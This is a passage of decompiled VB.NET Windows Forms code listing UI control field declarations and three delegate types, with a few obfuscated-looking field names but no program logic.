        <AccessedThroughProperty("PictureBox4")> _
        Private _PictureBox4 As PictureBox
        <AccessedThroughProperty("PictureBox5")> _
        Private _PictureBox5 As PictureBox
        <AccessedThroughProperty("PictureBox6")> _
        Private _PictureBox6 As PictureBox
        <AccessedThroughProperty("PictureBox7")> _
        Private _PictureBox7 As PictureBox
        <AccessedThroughProperty("RadioButton1")> _
        Private _RadioButton1 As RadioButton
        <AccessedThroughProperty("RadioButton2")> _
        Private _RadioButton2 As RadioButton
        <AccessedThroughProperty("RadioButton3")> _
        Private _RadioButton3 As RadioButton
        <AccessedThroughProperty("RadioButton4")> _
        Private _RadioButton4 As RadioButton
        <AccessedThroughProperty("RadioButton5")> _
        Private _RadioButton5 As RadioButton
        <AccessedThroughProperty("RadioButton6")> _
        Private _RadioButton6 As RadioButton
        <AccessedThroughProperty("SideTab1")> _
        Private _SideTab1 As Control0
        <AccessedThroughProperty("TabPage1")> _
        Private _TabPage1 As TabPage
        <AccessedThroughProperty("TabPage2")> _
        Private _TabPage2 As TabPage
        <AccessedThroughProperty("TabPage3")> _
        Private _TabPage3 As TabPage
        <AccessedThroughProperty("TabPage4")> _
        Private _TabPage4 As TabPage
        <AccessedThroughProperty("TabPage5")> _
        Private _TabPage5 As TabPage
        <AccessedThroughProperty("TabPage6")> _
        Private _TabPage6 As TabPage
        <AccessedThroughProperty("TabPage7")> _
        Private _TabPage7 As TabPage
        <AccessedThroughProperty("TextBox1")> _
        Private _TextBox1 As TextBox
        <AccessedThroughProperty("TextBox2")> _
        Private _TextBox2 As TextBox
        <AccessedThroughProperty("TextBox3")> _
        Private _TextBox3 As TextBox
        <AccessedThroughProperty("TextBox4")> _
        Private _TextBox4 As TextBox
        <AccessedThroughProperty("TextBox5")> _
        Private _TextBox5 As TextBox
        <AccessedThroughProperty("TextBox6")> _
        Private _TextBox6 As TextBox
        <AccessedThroughProperty("TextBox7")> _
        Private _TextBox7 As TextBox
        <AccessedThroughProperty("TextBox8")> _
        Private _TextBox8 As TextBox
        <AccessedThroughProperty("TextBox9")> _
        Private _TextBox9 As TextBox
        <AccessedThroughProperty("Win8Progressbar1")> _
        Private _Win8Progressbar1 As Win8Progressbar
        <AccessedThroughProperty("CheckBox11")> _
        Private checkBox_0 As CheckBox
        <AccessedThroughProperty("CheckBox12")> _
        Private checkBox_1 As CheckBox
        <AccessedThroughProperty("CheckBox13")> _
        Private checkBox_2 As CheckBox
        <AccessedThroughProperty("CheckBox14")> _
        Private checkBox_3 As CheckBox
        <AccessedThroughProperty("CheckBox10")> _
        Private checkBox_4 As CheckBox
        <AccessedThroughProperty("CheckBox15")> _
        Private checkBox_5 As CheckBox
        <AccessedThroughProperty("GroupBox10")> _
        Private groupBox_0 As GroupBox
        <AccessedThroughProperty("PictureBox2")> _
        Private hpyZaNmIi As PictureBox
        Private icontainer_0 As IContainer
        <AccessedThroughProperty("TextBox10")> _
        Private textBox_0 As TextBox
        <AccessedThroughProperty("TextBox11")> _
        Private textBox_1 As TextBox
        <AccessedThroughProperty("TextBox12")> _
        Private textBox_2 As TextBox
        Private thread_0 As Thread
        <AccessedThroughProperty("ToolTip1")> _
        Private toolTip_0 As ToolTip
        <AccessedThroughProperty("Label19")> _
        Private YrTaPhYjR As Label

        ' Nested Types
        Public Delegate Sub DelegateStopCheck()

        Public Delegate Sub DelegateToggleConnectionResult(ByVal success As Integer)

        Public Delegate Sub DelShowit()
    End Class
End Namespace

